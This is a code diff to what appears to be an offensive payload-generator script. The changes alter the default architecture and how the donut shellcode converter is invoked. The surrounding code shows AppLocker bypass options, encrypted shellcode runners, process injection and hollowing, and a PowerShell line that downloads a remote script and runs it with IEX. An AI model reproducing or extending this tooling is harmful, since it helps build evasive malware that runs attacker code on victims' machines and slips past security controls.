@@ -42,7 +42,7 @@ def argparser():
     parser.add_argument('--applocker-path', metavar='PATH', default='C:\\Windows\\Tasks', help='applocker bypass {cs}')
     
     parser.add_argument('--platform', choices=['windows', 'linux'], type=str.lower, default='windows', help='payload platform')
-    parser.add_argument('--arch', choices=['x32', 'x64', 'any'], type=str.lower, default='x64', help='payload architecture')
+    parser.add_argument('--arch', choices=['x32', 'x64', 'any'], type=str.lower, default='any', help='payload architecture')
     
     parser.add_argument('--delay', type=int, help='delay payload execution')
     parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='XOR', type=lambda v: None if v.lower() == "none" else v.upper(), help='encrypt the payload')
@@ -79,22 +79,15 @@ def argparser():
 
     return args
 
-def donut(input, output, arch='x64', amsi=True, _class=None, method=None, verbose=False):
-    command = [os.path.join(rootdir, 'tradecraft/bin/donut'), '--input:'+input, '--output:'+output]
+def donut(input, output, arch='any', amsi=True, _class=None, method=None, verbose=False):
+    arch = arch.lower().replace('x32', 'x86').replace('x64', 'amd64').replace('any', 'x86+amd64')
+    command = [os.path.join(rootdir, 'tradecraft/bin/donut'), '--arch:'+arch, '--input:'+input, '--output:'+output]
     if os.path.splitext(input)[1] == '.dll' and _class and method:
         command.append('--class:'+_class)
         command.append('--method:'+method)
-    if arch == 'x32':
-        command.append('--arch:1')
-    elif arch == 'x64':
-        command.append('--arch:2')
-    else:
-        command.append('--arch:3')
-    if not amsi:
-        command.append('--bypass:1')
     build(command, verbose)
 
-def mcs(input, output, arch='x64', links=[], delay=None, encrypt=None, hide=None, verbose=False):
+def mcs(input, output, arch='any', links=[], delay=None, encrypt=None, hide=None, verbose=False):
     arch = arch.lower().replace('x32', 'x86').replace('any', 'anycpu')
     command = ['mcs', '-unsafe', '-platform:'+arch, input, '-out:'+output]
     if links:
@@ -200,7 +193,7 @@ def main():
             code = cs.shellcode_runner(shellcode, args.encrypt, key, iv, args.delay)
         elif args.inject:
             print_info('Generating process injection payload')
-            code = cs.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.process)
+            code = cs.process_injection(shellcode, args.encrypt, key, iv, args.delay, args.process, args.arch)
         elif args.hollow:
             print_info('Generating process hollowing  payload')
             code = cs.process_hollowing(shellcode, args.encrypt, key, iv, args.delay, args.process)
@@ -253,7 +246,6 @@ def main():
                 reflection = os.path.splitext(target)[0] + '.ps1'
                 with open(reflection, 'w') as f:
                     f.write(code)
-                reflection_path = os.path.basename(reflection)
                 ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_name}.ps1") | IEX'
             
             elif output_ext == '.exe':
